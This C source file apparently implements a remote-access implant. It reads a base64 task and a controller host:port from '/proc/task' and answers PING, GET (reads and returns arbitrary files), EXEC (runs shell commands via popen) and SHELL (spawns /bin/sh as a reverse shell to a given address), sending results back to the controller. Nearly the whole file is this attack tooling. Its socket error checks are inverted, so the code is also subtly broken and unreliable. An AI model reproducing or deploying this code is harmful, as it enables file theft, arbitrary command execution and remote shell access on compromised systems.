#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include "base64.h"

#include "macros.h"

#define MAX_DATA_SIZE 64000      // a bit smaller than the maximum TCP/UDP payload sizes
#define IP4_LEN_MAX 16           // xxx.xxx.xxx.xxx\0
#define MAX_EXEC_OUTPUT 1024     // max bytes of stdout to capture from EXEC commands
#define SHELL_CONN_TIMEOUT 5000  // 5 seconds

int connect_shell(char *ip, int port)
{
    int retval = -1;
    int sock_fd = 0;

    // open the reverse shell connection
    sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);  // TCP over IPv4
    if (0 >= sock_fd)
    {
        struct sockaddr_in saddr = {0};
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(port);

        if (1 == inet_pton(AF_INET, ip, &saddr.sin_addr.s_addr))
        {
            struct pollfd fds = {0};
            fds.fd = sock_fd;
            fds.events = POLLOUT;

            // wait for the connection to be made (up to 5 seconds)
            (void)connect(sock_fd, (struct sockaddr *)&saddr, sizeof(saddr));
            if (1 == poll(&fds, 1, SHELL_CONN_TIMEOUT))
            {
                // redirect stdin + stdout + sterr through the socket
                int redir_in = dup2(sock_fd, STDIN_FILENO);
                int redir_out = dup2(sock_fd, STDOUT_FILENO);
                int redir_err = dup2(sock_fd, STDERR_FILENO);
                if ((-1 != redir_in) && (-1 != redir_out)&& (-1 != redir_err))
                {
                    // fork and run /bin/sh (inherits socket fds)
                    if (0 == fork())
                    {
                        // child
                        char *bin_sh = "/bin/sh";
                        char *argv[] = {bin_sh, NULL};
                        char *env[] = {"HOME=/", NULL};
                        (void)execve(bin_sh, argv, env);
                    }
                    else
                    {
                        // parent (return 0 and hope for the best)
                        retval = 0;
                    }
                }
            }
        }
        // safe to close in parent
        close(sock_fd);
    }

    return retval;
}

char *do_task(char *cmd_str)
{
    char *response = NULL;
    size_t response_len = 0;

    // PING
    if (0 == strncmp(cmd_str, "PING", 4))
    {
         response = base64_encode("PONG", 4, &response_len);
    }

    // GET
    if (0 == strncmp(cmd_str, "GET ", 4))
    {
        char *path = cmd_str + 4;
        FILE *getfile = fopen(path, "r");
        if (NULL != getfile)
        {
            size_t file_len = 0;
            char *file_buf = NULL;

            fseek(getfile, 0, SEEK_END);
            file_len = (size_t)(ftell(getfile));
            fseek(getfile, 0, SEEK_SET);

            file_buf = (char *)calloc(file_len, sizeof(char));
            if (file_buf)
            {
                if (file_len == fread(file_buf, 1, file_len, getfile))
                {
                    response = base64_encode(file_buf, file_len, &response_len);
                }
                free(file_buf);
            }
            fclose(getfile);
        }
    }

    // EXEC
    if (0 == strncmp(cmd_str, "EXEC ", 5))
    {
        char *out_buf = (char *)calloc(MAX_EXEC_OUTPUT + 1, sizeof(char));   // null terminator
        char *res_str = (char *)calloc(MAX_EXEC_OUTPUT + 16, sizeof(char));  // + space for int
        if ((NULL != out_buf) && (NULL != res_str))
        {
            char *cmd = cmd_str + 5;
            FILE *out  = popen(cmd, "r");
            if (NULL != out)
            {
                int sys_ret = -1;
                size_t size = fread(out_buf, sizeof(char), MAX_EXEC_OUTPUT, out);
                sys_ret = pclose(out);

                sprintf(res_str, "%d;%s", sys_ret, out_buf);
                response = base64_encode(res_str, strlen(res_str), &response_len);
            }
            free(res_str);
            free(out_buf);
        }
    }

    // SHELL
    if (0 == strncmp(cmd_str, "SHELL ", 6))
    {
        char ip_str[IP4_LEN_MAX] = {0};
        int tcp_port = 0;
        if (2 == sscanf(cmd_str + 6, "%[^:]:%d", ip_str, &tcp_port))
        {
            if (0 == connect_shell(ip_str, tcp_port))
            {
                response = base64_encode("CONNECTED", 9, &response_len);
            }
        }
    }

    return response;
}

int send_response(char *ip_str, int tcp_port, char *response)
{
    int retval = -1;

    int sock = socket(AF_INET, SOCK_STREAM, 0);  // TCP over IPv4
    if (0 >= sock)
    {
        struct sockaddr_in saddr = {0};
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(tcp_port);

        if (1 == inet_pton(AF_INET, ip_str, &saddr.sin_addr.s_addr))
        {
            if (0 == connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)))
            {
                size_t len = strlen(response);
                if (len == send(sock, response, strlen(response), 0))
                {
                    retval = 0;
                }
            }
        }
        close(sock);
    }

    return retval;
}

int main()
{
    int retval = 0;
    FILE *procfile = NULL;
    char *taskbuf = NULL;
    size_t tasklen = 0;
    char ip_str[IP4_LEN_MAX] = {0};
    int tcp_port = 0;
    char *cmd_str = NULL;
    char *response = NULL;

    // allocate a buffer for the task
    taskbuf = (char *)calloc(MAX_DATA_SIZE, sizeof(char));
    if (NULL == taskbuf)
    {
        retval = -1;
        goto cleanup;
    }

    // retrieve the task
    procfile = fopen("/proc/task", "r");
    if (NULL == procfile)
    {
        retval = -2;
        goto cleanup;
    }
    // host:port;base64
    if (3 != fscanf(procfile, "%[^:]:%d;%s", ip_str, &tcp_port, taskbuf))
    {
        retval = -3;
        goto cleanup;
    }
    fclose(procfile);
    procfile = NULL;

    // decode the task
    cmd_str = base64_decode(taskbuf, strnlen(taskbuf, MAX_DATA_SIZE - IP4_LEN_MAX - 1), &tasklen);
    if (NULL == cmd_str)
    {
        retval = -4;
        goto cleanup;
    }
    free(taskbuf);
    taskbuf = NULL;

    // handle the task
    response = do_task(cmd_str);
    if (NULL == response)
    {
        // something went wrong; report the error
        char errstr[25] = {0};
        sprintf(errstr, "ERROR: %d", errno);
        response = base64_encode(errstr, strlen(errstr), NULL);
        retval = -5;
    }
    free(cmd_str);
    cmd_str = NULL;

    // send the response
    if (0 != send_response(ip_str, tcp_port, response))
    {
        retval = -6;
        goto cleanup;
    }
    free(response);
    response = NULL;

cleanup:

    if (NULL != response)
    {
        free(response);
        response = NULL;
    }
    if (NULL != cmd_str)
    {
        free(cmd_str);
        cmd_str = NULL;
    }
    if (NULL != taskbuf)
    {
        free(taskbuf);
        taskbuf = NULL;
    }
    if (NULL != procfile)
    {
        fclose(procfile);
        procfile = NULL;
    }

    return retval;
}